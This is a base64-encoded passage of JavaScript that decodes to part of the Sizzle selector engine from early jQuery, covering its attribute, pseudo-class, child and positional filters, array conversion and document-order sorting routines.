KICAgICAgICB9LA0KICAgICAgICBBVFRSOiBmdW5jdGlvbihtYXRjaCwgY3VyTG9vcCwgaW5wbGFjZSwgcmVzdWx0LCBub3QsIGlzWE1MKXsNCiAgICAgICAgICAgIHZhciBuYW1lID0gbWF0Y2hbMV0ucmVwbGFjZSgvXFwvZywgIiIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoICFpc1hNTCAmJiBFeHByLmF0dHJNYXBbbmFtZV0gKSB7DQogICAgICAgICAgICAgICAgbWF0Y2hbMV0gPSBFeHByLmF0dHJNYXBbbmFtZV07DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmICggbWF0Y2hbMl0gPT09ICJ+PSIgKSB7DQogICAgICAgICAgICAgICAgbWF0Y2hbNF0gPSAiICIgKyBtYXRjaFs0XSArICIgIjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcmV0dXJuIG1hdGNoOw0KICAgICAgICB9LA0KICAgICAgICBQU0VVRE86IGZ1bmN0aW9uKG1hdGNoLCBjdXJMb29wLCBpbnBsYWNlLCByZXN1bHQsIG5vdCl7DQogICAgICAgICAgICBpZiAoIG1hdGNoWzFdID09PSAibm90IiApIHsNCiAgICAgICAgICAgICAgICAvLyBJZiB3ZSdyZSBkZWFsaW5nIHdpdGggYSBjb21wbGV4IGV4cHJlc3Npb24sIG9yIGEgc2ltcGxlIG9uZQ0KICAgICAgICAgICAgICAgIGlmICggKCBjaHVua2VyLmV4ZWMobWF0Y2hbM10pIHx8ICIiICkubGVuZ3RoID4gMSB8fCAvXlx3Ly50ZXN0KG1hdGNoWzNdKSApIHsNCiAgICAgICAgICAgICAgICAgICAgbWF0Y2hbM10gPSBTaXp6bGUobWF0Y2hbM10sIG51bGwsIG51bGwsIGN1ckxvb3ApOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIHZhciByZXQgPSBTaXp6bGUuZmlsdGVyKG1hdGNoWzNdLCBjdXJMb29wLCBpbnBsYWNlLCB0cnVlIF4gbm90KTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCAhaW5wbGFjZSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoLmFwcGx5KCByZXN1bHQsIHJldCApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2UgaWYgKCBFeHByLm1hdGNoLlBPUy50ZXN0KCBtYXRjaFswXSApIHx8IEV4cHIubWF0Y2guQ0hJTEQudGVzdCggbWF0Y2hbMF0gKSApIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuIG1hdGNoOw0KICAgICAgICB9LA0KICAgICAgICBQT1M6IGZ1bmN0aW9uKG1hdGNoKXsNCiAgICAgICAgICAgIG1hdGNoLnVuc2hpZnQoIHRydWUgKTsNCiAgICAgICAgICAgIHJldHVybiBtYXRjaDsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgZmlsdGVyczogew0KICAgICAgICBlbmFibGVkOiBmdW5jdGlvbihlbGVtKXsNCiAgICAgICAgICAgIHJldHVybiBlbGVtLmRpc2FibGVkID09PSBmYWxzZSAmJiBlbGVtLnR5cGUgIT09ICJoaWRkZW4iOw0KICAgICAgICB9LA0KICAgICAgICBkaXNhYmxlZDogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gZWxlbS5kaXNhYmxlZCA9PT0gdHJ1ZTsNCiAgICAgICAgfSwNCiAgICAgICAgY2hlY2tlZDogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gZWxlbS5jaGVja2VkID09PSB0cnVlOw0KICAgICAgICB9LA0KICAgICAgICBzZWxlY3RlZDogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICAvLyBBY2Nlc3NpbmcgdGhpcyBwcm9wZXJ0eSBtYWtlcyBzZWxlY3RlZC1ieS1kZWZhdWx0DQogICAgICAgICAgICAvLyBvcHRpb25zIGluIFNhZmFyaSB3b3JrIHByb3Blcmx5DQogICAgICAgICAgICBlbGVtLnBhcmVudE5vZGUuc2VsZWN0ZWRJbmRleDsNCiAgICAgICAgICAgIHJldHVybiBlbGVtLnNlbGVjdGVkID09PSB0cnVlOw0KICAgICAgICB9LA0KICAgICAgICBwYXJlbnQ6IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuICEhZWxlbS5maXJzdENoaWxkOw0KICAgICAgICB9LA0KICAgICAgICBlbXB0eTogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gIWVsZW0uZmlyc3RDaGlsZDsNCiAgICAgICAgfSwNCiAgICAgICAgaGFzOiBmdW5jdGlvbihlbGVtLCBpLCBtYXRjaCl7DQogICAgICAgICAgICByZXR1cm4gISFTaXp6bGUoIG1hdGNoWzNdLCBlbGVtICkubGVuZ3RoOw0KICAgICAgICB9LA0KICAgICAgICBoZWFkZXI6IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuIC9oXGQvaS50ZXN0KCBlbGVtLm5vZGVOYW1lICk7DQogICAgICAgIH0sDQogICAgICAgIHRleHQ6IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuICJ0ZXh0IiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICByYWRpbzogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gInJhZGlvIiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICBjaGVja2JveDogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gImNoZWNrYm94IiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICBmaWxlOiBmdW5jdGlvbihlbGVtKXsNCiAgICAgICAgICAgIHJldHVybiAiZmlsZSIgPT09IGVsZW0udHlwZTsNCiAgICAgICAgfSwNCiAgICAgICAgcGFzc3dvcmQ6IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuICJwYXNzd29yZCIgPT09IGVsZW0udHlwZTsNCiAgICAgICAgfSwNCiAgICAgICAgc3VibWl0OiBmdW5jdGlvbihlbGVtKXsNCiAgICAgICAgICAgIHJldHVybiAic3VibWl0IiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICBpbWFnZTogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gImltYWdlIiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICByZXNldDogZnVuY3Rpb24oZWxlbSl7DQogICAgICAgICAgICByZXR1cm4gInJlc2V0IiA9PT0gZWxlbS50eXBlOw0KICAgICAgICB9LA0KICAgICAgICBidXR0b246IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuICJidXR0b24iID09PSBlbGVtLnR5cGUgfHwgZWxlbS5ub2RlTmFtZS50b1VwcGVyQ2FzZSgpID09PSAiQlVUVE9OIjsNCiAgICAgICAgfSwNCiAgICAgICAgaW5wdXQ6IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuIC9pbnB1dHxzZWxlY3R8dGV4dGFyZWF8YnV0dG9uL2kudGVzdChlbGVtLm5vZGVOYW1lKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgc2V0RmlsdGVyczogew0KICAgICAgICBmaXJzdDogZnVuY3Rpb24oZWxlbSwgaSl7DQogICAgICAgICAgICByZXR1cm4gaSA9PT0gMDsNCiAgICAgICAgfSwNCiAgICAgICAgbGFzdDogZnVuY3Rpb24oZWxlbSwgaSwgbWF0Y2gsIGFycmF5KXsNCiAgICAgICAgICAgIHJldHVybiBpID09PSBhcnJheS5sZW5ndGggLSAxOw0KICAgICAgICB9LA0KICAgICAgICBldmVuOiBmdW5jdGlvbihlbGVtLCBpKXsNCiAgICAgICAgICAgIHJldHVybiBpICUgMiA9PT0gMDsNCiAgICAgICAgfSwNCiAgICAgICAgb2RkOiBmdW5jdGlvbihlbGVtLCBpKXsNCiAgICAgICAgICAgIHJldHVybiBpICUgMiA9PT0gMTsNCiAgICAgICAgfSwNCiAgICAgICAgbHQ6IGZ1bmN0aW9uKGVsZW0sIGksIG1hdGNoKXsNCiAgICAgICAgICAgIHJldHVybiBpIDwgbWF0Y2hbM10gLSAwOw0KICAgICAgICB9LA0KICAgICAgICBndDogZnVuY3Rpb24oZWxlbSwgaSwgbWF0Y2gpew0KICAgICAgICAgICAgcmV0dXJuIGkgPiBtYXRjaFszXSAtIDA7DQogICAgICAgIH0sDQogICAgICAgIG50aDogZnVuY3Rpb24oZWxlbSwgaSwgbWF0Y2gpew0KICAgICAgICAgICAgcmV0dXJuIG1hdGNoWzNdIC0gMCA9PSBpOw0KICAgICAgICB9LA0KICAgICAgICBlcTogZnVuY3Rpb24oZWxlbSwgaSwgbWF0Y2gpew0KICAgICAgICAgICAgcmV0dXJuIG1hdGNoWzNdIC0gMCA9PSBpOw0KICAgICAgICB9DQogICAgfSwNCiAgICBmaWx0ZXI6IHsNCiAgICAgICAgUFNFVURPOiBmdW5jdGlvbihlbGVtLCBtYXRjaCwgaSwgYXJyYXkpew0KICAgICAgICAgICAgdmFyIG5hbWUgPSBtYXRjaFsxXSwgZmlsdGVyID0gRXhwci5maWx0ZXJzWyBuYW1lIF07DQoNCiAgICAgICAgICAgIGlmICggZmlsdGVyICkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmaWx0ZXIoIGVsZW0sIGksIG1hdGNoLCBhcnJheSApOw0KICAgICAgICAgICAgfSBlbHNlIGlmICggbmFtZSA9PT0gImNvbnRhaW5zIiApIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gKGVsZW0udGV4dENvbnRlbnQgfHwgZWxlbS5pbm5lclRleHQgfHwgIiIpLmluZGV4T2YobWF0Y2hbM10pID49IDA7DQogICAgICAgICAgICB9IGVsc2UgaWYgKCBuYW1lID09PSAibm90IiApIHsNCiAgICAgICAgICAgICAgICB2YXIgbm90ID0gbWF0Y2hbM107DQoNCiAgICAgICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDAsIGwgPSBub3QubGVuZ3RoOyBpIDwgbDsgaSsrICkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoIG5vdFtpXSA9PT0gZWxlbSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9LA0KICAgICAgICBDSElMRDogZnVuY3Rpb24oZWxlbSwgbWF0Y2gpew0KICAgICAgICAgICAgdmFyIHR5cGUgPSBtYXRjaFsxXSwgbm9kZSA9IGVsZW07DQogICAgICAgICAgICBzd2l0Y2ggKHR5cGUpIHsNCiAgICAgICAgICAgICAgICBjYXNlICdvbmx5JzoNCiAgICAgICAgICAgICAgICBjYXNlICdmaXJzdCc6DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICggKG5vZGUgPSBub2RlLnByZXZpb3VzU2libGluZykgKSAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCBub2RlLm5vZGVUeXBlID09PSAxICkgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICggdHlwZSA9PSAnZmlyc3QnKSByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgbm9kZSA9IGVsZW07DQogICAgICAgICAgICAgICAgY2FzZSAnbGFzdCc6DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICggKG5vZGUgPSBub2RlLm5leHRTaWJsaW5nKSApICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIG5vZGUubm9kZVR5cGUgPT09IDEgKSByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgY2FzZSAnbnRoJzoNCiAgICAgICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gbWF0Y2hbMl0sIGxhc3QgPSBtYXRjaFszXTsNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoIGZpcnN0ID09IDEgJiYgbGFzdCA9PSAwICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHZhciBkb25lTmFtZSA9IG1hdGNoWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyZW50ID0gZWxlbS5wYXJlbnROb2RlOw0KICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoIHBhcmVudCAmJiAocGFyZW50LnNpemNhY2hlICE9PSBkb25lTmFtZSB8fCAhZWxlbS5ub2RlSW5kZXgpICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoIG5vZGUgPSBwYXJlbnQuZmlyc3RDaGlsZDsgbm9kZTsgbm9kZSA9IG5vZGUubmV4dFNpYmxpbmcgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCBub2RlLm5vZGVUeXBlID09PSAxICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub2RlLm5vZGVJbmRleCA9ICsrY291bnQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudC5zaXpjYWNoZSA9IGRvbmVOYW1lOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB2YXIgZGlmZiA9IGVsZW0ubm9kZUluZGV4IC0gbGFzdDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCBmaXJzdCA9PSAwICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRpZmYgPT0gMDsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoIGRpZmYgJSBmaXJzdCA9PSAwICYmIGRpZmYgLyBmaXJzdCA+PSAwICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwNCiAgICAgICAgSUQ6IGZ1bmN0aW9uKGVsZW0sIG1hdGNoKXsNCiAgICAgICAgICAgIHJldHVybiBlbGVtLm5vZGVUeXBlID09PSAxICYmIGVsZW0uZ2V0QXR0cmlidXRlKCJpZCIpID09PSBtYXRjaDsNCiAgICAgICAgfSwNCiAgICAgICAgVEFHOiBmdW5jdGlvbihlbGVtLCBtYXRjaCl7DQogICAgICAgICAgICByZXR1cm4gKG1hdGNoID09PSAiKiIgJiYgZWxlbS5ub2RlVHlwZSA9PT0gMSkgfHwgZWxlbS5ub2RlTmFtZSA9PT0gbWF0Y2g7DQogICAgICAgIH0sDQogICAgICAgIENMQVNTOiBmdW5jdGlvbihlbGVtLCBtYXRjaCl7DQogICAgICAgICAgICByZXR1cm4gKCIgIiArIChlbGVtLmNsYXNzTmFtZSB8fCBlbGVtLmdldEF0dHJpYnV0ZSgiY2xhc3MiKSkgKyAiICIpDQogICAgICAgICAgICAgICAgLmluZGV4T2YoIG1hdGNoICkgPiAtMTsNCiAgICAgICAgfSwNCiAgICAgICAgQVRUUjogZnVuY3Rpb24oZWxlbSwgbWF0Y2gpew0KICAgICAgICAgICAgdmFyIG5hbWUgPSBtYXRjaFsxXSwNCiAgICAgICAgICAgICAgICByZXN1bHQgPSBFeHByLmF0dHJIYW5kbGVbIG5hbWUgXSA/DQogICAgICAgICAgICAgICAgICAgIEV4cHIuYXR0ckhhbmRsZVsgbmFtZSBdKCBlbGVtICkgOg0KICAgICAgICAgICAgICAgICAgICBlbGVtWyBuYW1lIF0gIT0gbnVsbCA/DQogICAgICAgICAgICAgICAgICAgICAgICBlbGVtWyBuYW1lIF0gOg0KICAgICAgICAgICAgICAgICAgICAgICAgZWxlbS5nZXRBdHRyaWJ1dGUoIG5hbWUgKSwNCiAgICAgICAgICAgICAgICB2YWx1ZSA9IHJlc3VsdCArICIiLA0KICAgICAgICAgICAgICAgIHR5cGUgPSBtYXRjaFsyXSwNCiAgICAgICAgICAgICAgICBjaGVjayA9IG1hdGNoWzRdOw0KDQogICAgICAgICAgICByZXR1cm4gcmVzdWx0ID09IG51bGwgPw0KICAgICAgICAgICAgICAgIHR5cGUgPT09ICIhPSIgOg0KICAgICAgICAgICAgICAgIHR5cGUgPT09ICI9IiA/DQogICAgICAgICAgICAgICAgdmFsdWUgPT09IGNoZWNrIDoNCiAgICAgICAgICAgICAgICB0eXBlID09PSAiKj0iID8NCiAgICAgICAgICAgICAgICB2YWx1ZS5pbmRleE9mKGNoZWNrKSA+PSAwIDoNCiAgICAgICAgICAgICAgICB0eXBlID09PSAifj0iID8NCiAgICAgICAgICAgICAgICAoIiAiICsgdmFsdWUgKyAiICIpLmluZGV4T2YoY2hlY2spID49IDAgOg0KICAgICAgICAgICAgICAgICFjaGVjayA/DQogICAgICAgICAgICAgICAgdmFsdWUgJiYgcmVzdWx0ICE9PSBmYWxzZSA6DQogICAgICAgICAgICAgICAgdHlwZSA9PT0gIiE9IiA/DQogICAgICAgICAgICAgICAgdmFsdWUgIT0gY2hlY2sgOg0KICAgICAgICAgICAgICAgIHR5cGUgPT09ICJePSIgPw0KICAgICAgICAgICAgICAgIHZhbHVlLmluZGV4T2YoY2hlY2spID09PSAwIDoNCiAgICAgICAgICAgICAgICB0eXBlID09PSAiJD0iID8NCiAgICAgICAgICAgICAgICB2YWx1ZS5zdWJzdHIodmFsdWUubGVuZ3RoIC0gY2hlY2subGVuZ3RoKSA9PT0gY2hlY2sgOg0KICAgICAgICAgICAgICAgIHR5cGUgPT09ICJ8PSIgPw0KICAgICAgICAgICAgICAgIHZhbHVlID09PSBjaGVjayB8fCB2YWx1ZS5zdWJzdHIoMCwgY2hlY2subGVuZ3RoICsgMSkgPT09IGNoZWNrICsgIi0iIDoNCiAgICAgICAgICAgICAgICBmYWxzZTsNCiAgICAgICAgfSwNCiAgICAgICAgUE9TOiBmdW5jdGlvbihlbGVtLCBtYXRjaCwgaSwgYXJyYXkpew0KICAgICAgICAgICAgdmFyIG5hbWUgPSBtYXRjaFsyXSwgZmlsdGVyID0gRXhwci5zZXRGaWx0ZXJzWyBuYW1lIF07DQoNCiAgICAgICAgICAgIGlmICggZmlsdGVyICkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmaWx0ZXIoIGVsZW0sIGksIG1hdGNoLCBhcnJheSApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KdmFyIG9yaWdQT1MgPSBFeHByLm1hdGNoLlBPUzsNCg0KZm9yICggdmFyIHR5cGUgaW4gRXhwci5tYXRjaCApIHsNCiAgICBFeHByLm1hdGNoWyB0eXBlIF0gPSBuZXcgUmVnRXhwKCBFeHByLm1hdGNoWyB0eXBlIF0uc291cmNlICsgLyg/IVteXFtdKlxdKSg/IVteXChdKlwpKS8uc291cmNlICk7DQogICAgRXhwci5sZWZ0TWF0Y2hbIHR5cGUgXSA9IG5ldyBSZWdFeHAoIC8oXig/Oi58XHJ8XG4pKj8pLy5zb3VyY2UgKyBFeHByLm1hdGNoWyB0eXBlIF0uc291cmNlICk7DQp9DQoNCnZhciBtYWtlQXJyYXkgPSBmdW5jdGlvbihhcnJheSwgcmVzdWx0cykgew0KICAgIGFycmF5ID0gQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoIGFycmF5LCAwICk7DQoNCiAgICBpZiAoIHJlc3VsdHMgKSB7DQogICAgICAgIHJlc3VsdHMucHVzaC5hcHBseSggcmVzdWx0cywgYXJyYXkgKTsNCiAgICAgICAgcmV0dXJuIHJlc3VsdHM7DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBhcnJheTsNCn07DQoNCi8vIFBlcmZvcm0gYSBzaW1wbGUgY2hlY2sgdG8gZGV0ZXJtaW5lIGlmIHRoZSBicm93c2VyIGlzIGNhcGFibGUgb2YNCi8vIGNvbnZlcnRpbmcgYSBOb2RlTGlzdCB0byBhbiBhcnJheSB1c2luZyBidWlsdGluIG1ldGhvZHMuDQp0cnkgew0KICAgIEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuY2hpbGROb2RlcywgMCApOw0KDQovLyBQcm92aWRlIGEgZmFsbGJhY2sgbWV0aG9kIGlmIGl0IGRvZXMgbm90IHdvcmsNCn0gY2F0Y2goZSl7DQogICAgbWFrZUFycmF5ID0gZnVuY3Rpb24oYXJyYXksIHJlc3VsdHMpIHsNCiAgICAgICAgdmFyIHJldCA9IHJlc3VsdHMgfHwgW107DQoNCiAgICAgICAgaWYgKCB0b1N0cmluZy5jYWxsKGFycmF5KSA9PT0gIltvYmplY3QgQXJyYXldIiApIHsNCiAgICAgICAgICAgIEFycmF5LnByb3RvdHlwZS5wdXNoLmFwcGx5KCByZXQsIGFycmF5ICk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoIHR5cGVvZiBhcnJheS5sZW5ndGggPT09ICJudW1iZXIiICkgew0KICAgICAgICAgICAgICAgIGZvciAoIHZhciBpID0gMCwgbCA9IGFycmF5Lmxlbmd0aDsgaSA8IGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0LnB1c2goIGFycmF5W2ldICk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDA7IGFycmF5W2ldOyBpKysgKSB7DQogICAgICAgICAgICAgICAgICAgIHJldC5wdXNoKCBhcnJheVtpXSApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiByZXQ7DQogICAgfTsNCn0NCg0KdmFyIHNvcnRPcmRlcjsNCg0KaWYgKCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuY29tcGFyZURvY3VtZW50UG9zaXRpb24gKSB7DQogICAgc29ydE9yZGVyID0gZnVuY3Rpb24oIGEsIGIgKSB7DQogICAgICAgIGlmICggIWEuY29tcGFyZURvY3VtZW50UG9zaXRpb24gfHwgIWIuY29tcGFyZURvY3VtZW50UG9zaXRpb24gKSB7DQogICAgICAgICAgICBpZiAoIGEgPT0gYiApIHsNCiAgICAgICAgICAgICAgICBoYXNEdXBsaWNhdGUgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIDA7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgcmV0ID0gYS5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbihiKSAmIDQgPyAtMSA6IGEgPT09IGIgPyAwIDogMTsNCiAgICAgICAgaWYgKCByZXQgPT09IDAgKSB7DQogICAgICAgICAgICBoYXNEdXBsaWNhdGUgPSB0cnVlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiByZXQ7DQogICAgfTsNCn0gZWxzZSBpZiAoICJzb3VyY2VJbmRleCIgaW4gZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50ICkgew0KICAgIHNvcnRPcmRlciA9IGZ1bmN0aW9uKCBhLCBiICkgew0KICAgICAgICBpZiAoICFhLnNvdXJjZUluZGV4IHx8ICFiLnNvdXJjZUluZGV4ICkgew0KICAgICAgICAgICAgaWYgKCBhID09IGIgKSB7DQogICAgICAgICAgICAgICAgaGFzRHVwbGljYXRlID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHJldCA9IGEuc291cmNlSW5kZXggLSBiLnNvdXJjZUluZGV4Ow0KICAgICAgICBpZiAoIHJldCA9PT0gMCApIHsNCiAgICAgICAgICAgIGhhc0R1cGxpY2F0ZSA9IHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHJldDsNCiAgICB9Ow0KfSBlbHNlIGlmICggZG9jdW1lbnQuY3JlYXRlUmFuZ2UgKSB7DQogICAgc29ydE9yZGVyID0gZnVuY3Rpb24oIGEsIGIgKSB7DQogICAgICAgIGlmICggIWEub3duZXJEb2N1bWVudCB8fCAhYi5vd25lckRvY3VtZW50ICkgew0KICAgICAgICAgICAgaWYgKCBhID09IGIgKSB7DQogICAgICAgICAgICAgICAgaGFzRHVwbGljYXRlID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIGFSYW5nZSA9IGEub3duZXJEb2N1bWVudC5jcmVhdGVSYW5nZSgpLCBiUmFuZ2UgPSBiLm93bmVyRG9jdW1lbnQuY3JlYXRlUmFuZ2UoKTsNCiAgICAgICAgYVJhbmdlLnNldFN0YXJ0KGEsIDApOw0KICAgICAgICBhUmFuZ2Uuc2V0RW5kKGEsIDApOw0KICAgICAgICBiUmFuZ2Uuc2V0U3RhcnQoYiwgMCk7DQogICAgICAgIGJSYW5nZS5zZXRFbmQoYiwgMCk7DQogICAgICAgIHZhciByZXQgPSBhUmFuZ2UuY29tcGFyZUJvdW5kYXJ5UG9pbnRzKFJhbmdlLlNUQVJUX1RPX0VORCwgYlJhbmdlKTsNCiAgICAgICAgaWYgKCByZXQgPT09IDAgKSB7DQogICAgICAgICAgICBoYXNEdXBsaWNhdGUgPSB0cnVlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiByZXQ7DQogICAgfTsNCn0NCg0KLy8gQ2hlY2sgdG8gc2VlIGlmIHRoZSBicm93c2VyIHJldHVybnMgZWxlbWVudHMgYnkgbmFtZSB3aGVuDQovLyBxdWVyeWluZyBieSBnZXRFbGVtZW50QnlJZCAoYW5kIHByb3ZpZGUgYSB3b3JrYXJvdW5kKQ0KKGZ1bmN0aW9uKCl7DQogICAgLy8gV2UncmUgZ29pbmcgdG8gaW5qZWN0IGEgZmFrZSBpbnB1dCBlbGVtZW50IHdpdGggYSBzcGVjaWZpZWQgbmFtZQ0KICAgIHZhciBmb3JtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2IiksDQogICAgICAgIGlkID0gInNjcmlwdCIgKyAobmV3IERhdGUpLmdldFRpbWUoKTsNCiAgICBmb3JtLmlubmVySFRNTCA9ICI8YSBuYW1lPSciICsgaWQgKyAiJy8+IjsNCg0KICAgIC8vIEluamVjdCBpdCBpbnRvIHRoZSByb290IGVsZW1lbnQsIGNoZWNrIGl0cyBzdGF0dXMsIGFuZCByZW1vdmUgaXQgcXVpY2tseQ0KICAgIHZhciByb290ID0gZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Ow0KICAgIHJvb3QuaW5zZXJ0QmVmb3JlKCBmb3JtLCByb290LmZpcnN0Q2hpbGQgKTsNCg0KICAgIC8vIFRoZSB3b3JrYXJvdW5kIGhhcyB0byBkbyBhZGRpdGlvbmFsIGNoZWNrcyBhZnRlciBhIGdldEVsZW1lbnRCeUlkDQogICAgLy8gV2hpY2ggc2xvd3MgdGhpbmdzIGRvd24gZm9yIG90aGVyIGJyb3dzZXJzIChoZW5jZSB0aGUgYnJhbmNoaW5nKQ0KICAgIGlmICggISFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCggaWQgKSApIHsNCiAgICAgICAgRXhwci5maW5kLklEID0gZnVuY3Rpb24obWF0Y2gsIGNvbnRleHQsIGlzWE1MKXsNCiAgICAgICAgICAgIGlmICggdHlwZW9mIGNvbnRleHQuZ2V0RWxlbWVudEJ5SWQgIT09ICJ1bmRlZmluZWQiICYmICFpc1hNTCApIHsNCiAgICAgICAgICAgICAgICB2YXIgbSA9IGNvbnRleHQuZ2V0RWxlbWVudEJ5SWQobWF0Y2hbMV0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBtID8gbS5pZCA9PT0gbWF0Y2hbMV0gfHwgdHlwZW9mIG0uZ2V0QXR0cmlidXRlTm9kZSAhPT0gInVuZGVmaW5lZCIgJiYgbS5nZXRBdHRyaWJ1dGVOb2RlKCJpZCIpLm5vZGVWYWx1ZSA9PT0gbWF0Y2hbMV0gPyBbbV0gOiB1bmRlZmluZWQgOiBbXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfTsNCg0KICAgICAgICBFeHByLmZpbHRlci5JRCA9IGZ1bmN0aW9uKGVsZW0sIG1hdGNoKXsNCiAgICAgICAgICAgIHZhciBub2RlID0gdHlwZW9mIGVsZW0uZ2V0QXR0cmlidXRlTm9kZSAhPT0gInVuZGVmaW5lZCIgJiYgZWxlbS5nZXRBdHRyaWJ1dGVOb2RlKCJpZCIpOw0KICAgICAgICAgICAgcmV0dXJuIGVsZW0ubm9kZVR5cGUgPT09IDEgJiYgbm9kZSAmJiBub2RlLm5vZGVWYWx1ZSA9PT0gbWF0Y2g7DQogICAgICAgIH07DQogICAgfQ0KDQogICAgc